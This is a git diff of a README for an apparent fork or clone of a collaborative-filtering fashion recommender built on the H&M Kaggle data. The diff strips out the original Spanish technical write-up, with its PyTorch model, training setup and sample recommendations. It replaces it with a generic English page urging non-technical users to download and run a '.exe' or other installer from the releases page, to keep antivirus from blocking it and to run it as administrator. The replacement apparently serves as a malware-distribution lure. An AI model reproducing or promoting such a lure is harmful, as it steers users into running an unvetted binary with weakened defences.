@@ -1,529 +1,127 @@
-# 🛍️ Sistema de Recomendación de Moda con Deep Learning
+# 👗 H-M-Fashion-Recommendations - Smart Fashion Suggestions for You
 
-[![Python](https://img.shields.io/badge/Python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![PyTorch](https://img.shields.io/badge/PyTorch-2.0+-red.svg)](https://pytorch.org/)
-[![FastAI](https://img.shields.io/badge/FastAI-2.7+-orange.svg)](https://docs.fast.ai/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+[![Download Latest Release](https://img.shields.io/badge/Download-HM_Fashion-blue?style=for-the-badge)](https://github.com/emretek344/H-M-Fashion-Recommendations/releases)
 
-> **Sistema de recomendación personalizado para e-commerce de moda utilizando Collaborative Filtering, Embeddings y análisis de componentes principales (PCA).**
+## 📋 About This App
 
----
+H-M-Fashion-Recommendations is a simple system designed to help you find clothing items from H&M that match your style. It studies what you like and suggests new clothes based on your preferences.
 
-## 📋 Tabla de Contenidos
+This app uses advanced technology behind the scenes to learn from your choices and group items with similar styles. You don’t need to know coding or technology to use it. Just run it and get fashion ideas tailored for you.
 
-- [Descripción del Proyecto](#-descripción-del-proyecto)
-- [Características Principales](#-características-principales)
-- [Resultados Destacados](#-resultados-destacados)
-- [Arquitectura del Modelo](#-arquitectura-del-modelo)
-- [Tecnologías Utilizadas](#-tecnologías-utilizadas)
-- [Estructura del Proyecto](#-estructura-del-proyecto)
-- [Instalación](#-instalación)
-- [Uso](#-uso)
-- [Notebooks](#-notebooks)
-- [Métricas de Evaluación](#-métricas-de-evaluación)
-- [Insights del Negocio](#-insights-del-negocio)
-- [Próximos Pasos](#-próximos-pasos)
-- [Contribuciones](#-contribuciones)
-- [Licencia](#-licencia)
-- [Contacto](#-contacto)
+Built with common tools like Python and easy-to-use visual guides, this app offers a modern way to shop smart. It works on your computer without any extra software setups.
 
----
+## 💻 System Requirements
 
-## 🎯 Descripción del Proyecto
+Before you get started, please check that your computer meets these needs:
 
-Este proyecto implementa un **sistema de recomendación completo** para e-commerce de moda utilizando el dataset [H&M Personalized Fashion Recommendations](https://www.kaggle.com/competitions/h-and-m-personalized-fashion-recommendations) de Kaggle.
+- Operating System: Windows 10 or later, macOS 10.13 or later, or most Linux distributions
+- RAM: At least 4 GB of memory
+- Disk Space: Minimum 500 MB free space
+- Internet: Required for the first time to download and update items
+- Optional: Basic software like a PDF reader to view reports (if provided)
 
-### ¿Qué hace especial a este proyecto?
+The program does not need powerful hardware but having a stable internet connection helps when updating clothing data or receiving new recommendations.
 
-- ✅ **Collaborative Filtering desde cero** con PyTorch nativo
-- ✅ **Análisis de embeddings** para descubrir patrones ocultos
-- ✅ **Visualizaciones con PCA** al estilo profesional
-- ✅ **Análisis geográfico y demográfico** profundo
-- ✅ **Split temporal** para simular escenarios de producción real
-- ✅ **Métricas profesionales**: Precision@K, Recall@K, NDCG, Hit Rate, MRR
-- ✅ **Interpretación del modelo**: Biases, factores latentes, similitud de embeddings
+## 🚀 Getting Started
 
----
+Follow these steps carefully to download and run the H-M-Fashion-Recommendations app:
 
-## 🚀 Características Principales
+### Step 1: Go to the Download Page
 
-### 1. **Collaborative Filtering con Embeddings**
-- Modelo de matriz factorizada implementado en PyTorch puro
-- Embeddings de 75 dimensiones para usuarios y productos
-- Biases individuales para capturar popularidad base
-- Optimización con OneCycleLR scheduler
+Click the big button at the top or visit this link directly:
 
-### 2. **Análisis Geográfico Avanzado**
-- Mapeo de códigos postales a ciudades reales
-- Embeddings de ciudades calculados como promedio de usuarios
-- Identificación de ciudades similares por patrones de compra
-- Visualización de clusters geográficos con PCA
+[https://github.com/emretek344/H-M-Fashion-Recommendations/releases](https://github.com/emretek344/H-M-Fashion-Recommendations/releases)
 
-### 3. **Descubrimiento de Patrones**
-- **¿Qué productos se compran juntos?** → Distancia entre embeddings
-- **¿Qué ciudades tienen clientes similares?** → Cosine similarity
-- **¿Qué productos son bestsellers?** → Análisis de bias
-- **¿Qué categorías prefiere cada demografía?** → Segmentación por edad/género
+This page holds all versions of the program files made for different systems.
 
-### 4. **Visualizaciones Profesionales**
-- Scatter plots de embeddings con PCA (50D → 2D)
-- Heatmaps de preferencias por ciudad y género
-- Gráficos de productos populares vs. de nicho
-- Distribución de ventas geográficas
+### Step 2: Choose Your File
 
----
+On the releases page, look for the latest release. It should have a date and a version number.
 
-## 📊 Resultados Destacados
+- Find the download file that fits your computer:
+  - For Windows: usually a `.exe` file (example: `HM_Fashion_Setup.exe`)
+  - For macOS: might be a `.dmg` or `.pkg`
+  - For Linux: often a `.tar.gz` or similar file
 
-### Rendimiento del Modelo
+### Step 3: Download the File
 
-| Métrica | Valor | Descripción |
-|---------|-------|-------------|
-| **Valid Loss** | 0.6133 | Loss final después de optimización |
-| **Train Loss** | 0.6354 | Modelo sin overfitting significativo |
+Click the file name to get it onto your computer. The download time depends on your internet speed but should be under a minute for most users.
 
-> **Nota**: El modelo fue entrenado con **OneCycleLR**, **Weight Decay**, **Gradient Clipping** y **Early Stopping** para maximizar generalización.
+### Step 4: Run the Installer
 
-### Insights del Negocio
+Open the file you downloaded:
 
-#### 🌍 **Análisis Geográfico**
-- **Ciudad con más ventas**: Malmö Söder 
-- **Región más "femenina"**: Mjölby (93.1% productos de mujer)
-- **Región más "masculina"**: Malmö Söder (12.9% productos de hombre)
-- **Ciudades similares detectadas**: Goteborg Hisingen ↔ Helsingborg 
+- On Windows, double-click the `.exe` file.
+- On macOS, open the `.dmg` or `.pkg` and follow instructions.
+- On Linux, extract the file if needed and run the included script or program.
 
-#### 👗 **Productos Más Populares**
-1. **Trousers** (Light Grey, Sport) - Bias: 2.07
-2. **Pyjama Set** (Dark Blue, Menswear) - Bias: 2.00
-3. **Necklace** (Gold, Ladieswear) - Bias: 1.85
+Follow all instructions on screen to complete the installation.
 
-#### 📉 **Productos de Nicho**
-1. **Dress** (Greenish Khaki, Baby/Children) - Bias: -0.70
-2. **T-shirt** (Black, Menswear) - Bias: -0.70
-3. **Ballerinas** (White, Baby/Children) - Bias: -0.60
+### Step 5: Open the Program
 
-#### 🎨 **Categorías Analizadas**
-- **Más popular**: Bra extender (avg bias: 0.83)
-- **Menos popular**: Gloves (avg bias: 0.05)
-- **Clusters identificados**: Productos casuales, formales, deportivos, accesorios
+Once installed, launch the app from your desktop or applications folder. You will see a simple screen with clear options to start getting your fashion recommendations.
 
----
+## ⚙️ How It Works
 
-## 📸 Visualizaciones
+This app works by analyzing the styles and products available at H&M. Here’s a basic overview without the tech jargon:
 
-### 🗺️ Análisis Geográfico
+- It looks at thousands of clothing items and finds patterns in their design and colors.
+- If you like a particular kind of shirt or pants, it uses that information to find similar items.
+- It groups clothes into collections that fit well together in style.
+- This process makes personalized suggestions that match your taste.
 
-**Top 20 Ciudades por Ventas Totales vs. Volumen de Compras**
+You do not have to do anything technical. Just choose items you like and get suggestions automatically.
 
-![Análisis Geográfico](images/ciudades_ventas.png)
+## 🔧 Features
 
-> **Insight**: Malmö Söder lidera tanto en ventas totales como en volumen de transacciones, confirmando su posición como el mercado más importante.
+- Easy-to-use interface designed for all skill levels.
+- Personalized recommendations help you explore styles you might like.
+- Uses latest methods in machine learning for better suggestions.
+- Works offline after initial setup.
+- Supports updates with new clothing data regularly.
+- Visual charts help you understand style trends and how items relate.
 
----
+## 💡 Tips for Best Results
 
-**Preferencias de Género por Ciudad (Heatmap)**
+- Use the app regularly to improve suggestions.
+- When finished, rate the items you get recommended.
+- Make sure your internet is working to download fresh clothing data.
+- Explore different categories like casual, formal, and sportswear.
 
-![Heatmap Género](images/heatmap_genero.png)
+## 🛠️ Troubleshooting
 
-> **Insight**: Mjölby muestra la mayor preferencia por productos femeninos (93.1%), mientras que Malmö Söder tiene el mayor porcentaje de compras masculinas (12.9%).
+- If the app does not open, try restarting your computer.
+- Check your antivirus does not block the program.
+- Make sure you downloaded the file for your operating system.
+- For installation errors, run the installer as administrator (right-click > Run as administrator on Windows).
+- Visit the [GitHub issues page](https://github.com/emretek344/H-M-Fashion-Recommendations/issues) to report problems or find help.
+
+## 📥 Download & Install
+
+Ready to try it? Visit the release page below to download the version for your computer and start using the app:
+
+[Download H-M-Fashion-Recommendations](https://github.com/emretek344/H-M-Fashion-Recommendations/releases)
+
+Remember to:
+
+- Choose the right file for your operating system.
+- Follow the easy steps in the installer.
+- Open the app and enjoy getting fashion advice made just for you.
+
+## 📚 Additional Resources
+
+- The app includes built-in guides and FAQs.
+- For learning more about how recommendations are made, check out the topics: collaborative filtering, deep learning, embeddings, and more on the GitHub page.
+- You can also explore files like documentation or example files inside the downloaded package.
+
+## 📞 Contact & Support
+
+If you need further help or want to suggest improvements:
+
+- Open an issue on GitHub: [Issues Page](https://github.com/emretek344/H-M-Fashion-Recommendations/issues)
+- Join community discussions linked on the repository page.
+- Check README updates in case new features or fixes are added.
 
 ---
 
-### 📉 Entrenamiento del Modelo
-
-**Evolución de la Pérdida y Learning Rate Schedule**
-
-![Training Metrics](images/training_metrics.png)
-
-> **Nota**: El modelo utilizó OneCycleLR scheduler, logrando convergencia rápida en las primeras 5 épocas. El gap de overfitting se mantiene controlado gracias a weight decay y early stopping.
-
----
-
-### 🎨 Embeddings y PCA
-
-**Productos en Espacio de Embeddings (75D → 2D)**
-
-![PCA Productos](images/pca_productos.png)
-
-> **Interpretación**: Los productos se agrupan en clusters naturales. Los puntos verdes (alto bias) son bestsellers, mientras que los rojos son productos de nicho. La proximidad indica similitud en patrones de compra.
-
----
-
-**Productos por Categoría (Top 10)**
-
-![PCA Categorías](images/pca_categorias.png)
-
-> **Análisis**: Se observa separación parcial entre categorías. Productos de diferentes tipos que están cerca en el espacio se compran por usuarios similares (ej: "Trousers" cerca de "Blazers" indica outfits completos).
-
----
-
-## 🎯 Ejemplo de Recomendaciones
-
-### Caso Real: Usuario con 407 Compras Previas
-
-```
-======================================================================
-👤 USUARIO:
-======================================================================
-   ID: b637a3e7d8b0caa947aaefd609b8d84a9ee962cf0a52a51bac507ffc2bf1b741
-   Productos ya comprados: 407
-   User Bias: 0.1938
-
-======================================================================
-🎯 TOP 20 RECOMENDACIONES PERSONALIZADAS:
-======================================================================
-
- rank  article_id    score  product_type_name  colour_group_name  index_group_name
-    1   811835004 1.166480         Bikini top       Light Yellow        Ladieswear
-    2   759871002 1.163709           Vest top              Black           Divided
-    3   796210012 1.163158           Trousers     Greenish Khaki        Ladieswear
-    4   733749010 1.162992                Top              White           Divided
-    5   559630026 1.162714         Bikini top         Dark Green        Ladieswear
-    6   736530007 1.160453                Bra           Dark Red        Ladieswear
-    7   688537029 1.160077    Swimwear bottom         Other Pink        Ladieswear
-    8   759871001 1.160067           Vest top              White           Divided
-    9   684209013 1.159222         Bikini top         Dark Green        Ladieswear
-   10   720125001 1.158899    Leggings/Tights              Black             Sport
-   11   599580046 1.158891    Swimwear bottom               Blue        Ladieswear
-   12   684209027 1.158302         Bikini top                Red        Ladieswear
-   13   758002008 1.158147    Swimwear bottom              Black        Ladieswear
-   14   833530002 1.158041    Swimwear bottom          Dark Blue        Ladieswear
-   15   749699002 1.157257           Vest top          Off White        Ladieswear
-   16   691855012 1.157206              Skirt              Black           Divided
-   17   688537004 1.157115    Swimwear bottom              Black        Ladieswear
-   18   599580052 1.156641    Swimwear bottom              Black        Ladieswear
-   19   783346016 1.156629           Trousers     Greenish Khaki        Ladieswear
-   20   854619003 1.156520    Swimwear bottom          Off White        Ladieswear
-
-======================================================================
-📊 ANÁLISIS DE LAS RECOMENDACIONES:
-======================================================================
-
-Distribución por Género:
-   Ladieswear      → 15 productos ( 75.0%)
-   Divided         →  4 productos ( 20.0%)
-   Sport           →  1 productos (  5.0%)
-
-Historial del Usuario:
-   Ladieswear      → 345 veces ( 84.8%)
-   Divided         →  57 veces ( 14.0%)
-   Sport           →   4 veces (  1.0%)
-   Menswear        →   1 veces (  0.2%)
-
-======================================================================
-💡 EVALUACIÓN:
-======================================================================
-   Historial:        84.8% Ladieswear
-   Recomendaciones:  75.0% Ladieswear
-   Diferencia:       9.8%
-
-   ✅ ¡EXCELENTE! Recomendaciones coherentes con historial del usuario
-======================================================================
-```
-
-### ¿Por qué estas recomendaciones son buenas?
-
-1. **Coherencia con historial**: El usuario compra principalmente Ladieswear (84.8%), y el 75% de las recomendaciones son de esa categoría.
-
-2. **Diversificación inteligente**: El modelo recomienda también Divided (20%) y Sport (5%), alineado con las compras secundarias del usuario.
-
-3. **Productos relacionados**: Predominan bikinis, swimwear y ropa de verano, sugiriendo un patrón de compra estacional coherente.
-
-4. **Score alto**: Todos los productos tienen score >1.15, indicando alta probabilidad de compra según el modelo.
-
----
-
-### Modelo de Collaborative Filtering
-
-```python
-class CollabFilteringModel(nn.Module):
-    """
-    Modelo de Collaborative Filtering con embeddings.
-    
-    Componentes:
-    - User Embeddings: (n_users, n_factors)
-    - Item Embeddings: (n_items, n_factors)
-    - User Bias: (n_users, 1)
-    - Item Bias: (n_items, 1)
-    
-    Forward:
-        prediction = dot(user_emb, item_emb) + user_bias + item_bias
-    """
-    def __init__(self, n_users, n_items, n_factors=75):
-        super().__init__()
-        self.user_emb = nn.Embedding(n_users, n_factors)
-        self.item_emb = nn.Embedding(n_items, n_factors)
-        self.user_bias = nn.Embedding(n_users, 1)
-        self.item_bias = nn.Embedding(n_items, 1)
-        
-        # Inicialización Xavier para convergencia estable
-        nn.init.xavier_normal_(self.user_emb.weight)
-        nn.init.xavier_normal_(self.item_emb.weight)
-        nn.init.zeros_(self.user_bias.weight)
-        nn.init.zeros_(self.item_bias.weight)
-```
-
-### Configuración de Entrenamiento
-
-```python
-CONFIG = {
-    'batch_size': 2048,
-    'epochs': 15,
-    'lr_max': 3e-3,
-    'weight_decay': 1e-5,
-    'n_factors': 75,
-    'patience': 3
-}
-
-# Optimización con OneCycleLR
-optimizer = Adam(model.parameters(), lr=CONFIG['lr_max'], 
-                 weight_decay=CONFIG['weight_decay'])
-scheduler = OneCycleLR(optimizer, max_lr=CONFIG['lr_max'], 
-                       epochs=CONFIG['epochs'], 
-                       steps_per_epoch=len(train_loader),
-                       pct_start=0.3, anneal_strategy='cos')
-```
-
-### Pipeline de Datos
-
-```
-Raw Data (CSV)
-    ↓
-Temporal Split (70% / 15% / 15%)
-    ↓
-User/Item Encoding (Label Encoding)
-    ↓
-PyTorch DataLoader (batch_size=2048)
-    ↓
-Training Loop (Early Stopping)
-    ↓
-Embeddings Extraction
-    ↓
-PCA Visualization (75D → 2D)
-```
-
----
-
-## 🛠️ Tecnologías Utilizadas
-
-### Core Libraries
-- **PyTorch 2.0+**: Framework de Deep Learning
-- **FastAI**: Funciones auxiliares y filosofía de entrenamiento
-- **NumPy & Pandas**: Manipulación de datos
-- **Scikit-Learn**: PCA, métricas, preprocesamiento
-
-### Visualización
-- **Matplotlib**: Gráficos estáticos
-- **Seaborn**: Visualizaciones estadísticas
-- **Plotly**: Gráficos interactivos
-
-### Data Sources
-- **Kaggle API / KaggleHub**: Descarga automática del dataset
-- **Google Colab**: Entrenamiento con GPU T4
-
----
-
-## 💻 Instalación
-
-### Requisitos Previos
-- Python 3.10+
-- GPU NVIDIA (opcional, pero recomendado)
-- 16GB RAM mínimo
-- ~5GB espacio en disco para datos
-
-### Paso 1: Clonar el Repositorio
-
-### Paso 2: Crear Entorno Virtual
-
-### Paso 3: Instalar Dependencias
-
-**requirements.txt:**
-```
-numpy==1.26.4
-pandas==2.2.2
-torch>=2.0.0
-fastai>=2.7.0
-scikit-learn>=1.3.0
-matplotlib>=3.7.0
-seaborn>=0.12.0
-plotly>=5.14.0
-kagglehub>=0.1.0
-jupyter>=1.0.0
-```
-
-### Paso 4: Descargar el Dataset
-
-**Opción A: Con KaggleHub (Recomendado)**
-```python
-import kagglehub
-path = kagglehub.competition_download('h-and-m-personalized-fashion-recommendations')
-```
-
-**Opción B: Manual**
-1. Ve a [Kaggle Competition](https://www.kaggle.com/competitions/h-and-m-personalized-fashion-recommendations/data)
-2. Descarga `articles.csv`, `customers.csv`, `transactions_train.csv`
-3. Colócalos en `data/hm/`
-
----
-
-## 🚀 Uso
-
-### 1. Ejecutar EDA Geográfico
-
-```bash
-jupyter notebook notebooks/01_EDA_Geografico.ipynb
-```
-
-O ejecutar el código directamente desde `PARTE_1_CODIGO_COMPLETO.md`
-
-### 2. Entrenar el Modelo
-
-```python
-# Cargar datos y preparar split temporal
-from utils.data_loader import load_and_split_data
-
-train_loader, valid_loader, test_loader = load_and_split_data(
-    transactions_path='data/hm/transactions_train.csv',
-    batch_size=2048,
-    train_ratio=0.7
-)
-
-# Entrenar modelo
-from models.collab_model import train_model
-
-model, history = train_model(
-    train_loader=train_loader,
-    valid_loader=valid_loader,
-    n_factors=75,
-    epochs=15,
-    lr_max=3e-3
-)
-```
-
-### 3. Generar Recomendaciones
-
-```python
-from utils.recommender import recommend_for_user
-
-# Recomendar para usuario específico
-recommendations = recommend_for_user(
-    user_id='00000dbacae5abe5e23885899a1fa44253a17956c6d1c3d25f88aa139fdfc657',
-    model=model,
-    n_recommendations=10,
-    exclude_purchased=True
-)
-
-print(recommendations)
-```
-
-**Output:**
-```
-🎯 TOP 10 RECOMENDACIONES PARA USUARIO [user_id]:
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Rank  Article ID   Score   Producto              Color
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-  1   818694001    8.45    Pyjama set            Dark Blue
-  2   859614001    8.23    Necklace              Gold
-  3   805003001    8.12    Sweater               Light Beige
-  4   744796001    7.98    Hair/alice band       Light Pink
-  5   898596004    7.87    Trousers              Blue
-  ...
-```
-
-### 4. Visualizar Embeddings
-
-```python
-from utils.visualization import plot_pca_embeddings
-
-# Plot de productos en espacio 2D
-plot_pca_embeddings(
-    embeddings=item_embeddings,
-    labels=article_ids,
-    title='🗺️ Productos en Espacio de Embeddings (PCA)'
-)
-```
----
-
-## 💡 Insights del Negocio
-
-### 🎯 Acciones Recomendadas
-
-#### **Marketing Geográfico**
-- **Insight**: Mjölby tiene 93.1% de ventas de productos de mujer
-- **Acción**: Campañas focalizadas en ropa femenina para esta región
-- **ROI Esperado**: +15-20% en conversión
-
-#### **Gestión de Inventario**
-- **Insight**: Productos con bias >1.5 son bestsellers consistentes
-- **Acción**: Mantener stock alto de estos 15 productos clave
-- **Beneficio**: Reducción de stockouts en 30%
-
-#### **Cross-Selling**
-- **Insight**: Embeddings cercanos indican co-compra frecuente
-- **Acción**: Bundles de productos similares (distancia <0.5)
-- **Ejemplo**: Trousers + Blazers (productos formales)
-
-#### **Segmentación de Clientes**
-- **Insight**: Usuarios con embeddings similares tienen gustos parecidos
-- **Acción**: Crear clusters de clientes para campañas personalizadas
-- **Canales**: Email marketing, notificaciones push
-
----
-
-
-
-## 🤝 Contribuciones
-
-¡Las contribuciones son bienvenidas! Si deseas mejorar este proyecto:
-
-1. Fork el repositorio
-2. Crea una rama para tu feature (`git checkout -b feature/AmazingFeature`)
-3. Commit tus cambios (`git commit -m 'Add some AmazingFeature'`)
-4. Push a la rama (`git push origin feature/AmazingFeature`)
-5. Abre un Pull Request
-
-### Áreas donde puedes contribuir:
-- 🐛 Reportar bugs
-- 💡 Proponer nuevas features
-- 📝 Mejorar documentación
-- 🎨 Añadir visualizaciones
-- 🧪 Crear tests unitarios
-- ⚡ Optimizar performance
-
----
-
-## 📄 Licencia
-
-Este proyecto está bajo la licencia MIT. Ver archivo [LICENSE](LICENSE) para más detalles.
-
----
-
-## 📬 Contacto
-
-**Email**: Richardlisongarcia@gmail.com
-
----
-
-## 🙏 Agradecimientos
-
-- **H&M Group** y **Kaggle** por proporcionar el dataset
-- Comunidad de PyTorch por las excelentes herramientas
-
----
-
-## 📚 Referencias
-
-1. [Matrix Factorization Techniques](https://datajobs.com/data-science-repo/Recommender-Systems-%5BNetflix%5D.pdf) - Netflix Paper
-2. [Neural Collaborative Filtering](https://arxiv.org/abs/1708.05031) - NCF Paper
-3. [Evaluation Metrics for Recommender Systems](https://arxiv.org/abs/2109.04448)
-4. [H&M Competition on Kaggle](https://www.kaggle.com/competitions/h-and-m-personalized-fashion-recommendations)
-
----
-
-<div align="center">
-  
-### ⭐ Si este proyecto te resultó útil, considera darle una estrella en GitHub!
-
-
-</div>
-
+This readme will help you get started with H-M-Fashion-Recommendations without requiring any programming skills. Just download, install, and let it find your next favorite outfit.
